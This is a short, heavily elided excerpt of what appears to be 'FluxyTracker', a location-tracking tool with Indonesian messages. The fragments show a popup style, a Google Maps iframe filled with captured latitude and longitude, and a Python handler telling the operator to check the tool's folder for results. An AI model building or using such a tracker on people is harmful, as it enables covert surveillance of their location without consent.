...
<head>
  ...
  <style>
    ...
    *{box-sizing:border-box}
    ...
    .popup{position:fixed;top:0;left:0;width:100%;height:100%;background:#128aeb;display:none;align-items:center;justify-content:center;z-index:10}
...
src="https://maps.google.com/maps?q={lat},{lon}&hl=id&z=18&amp;output=embed"></iframe>
            ...
            print(f"[ ! ] PERIKSA DI FOLDER FluxyTracker")
            self.send_response(200)
            self.end_headers()
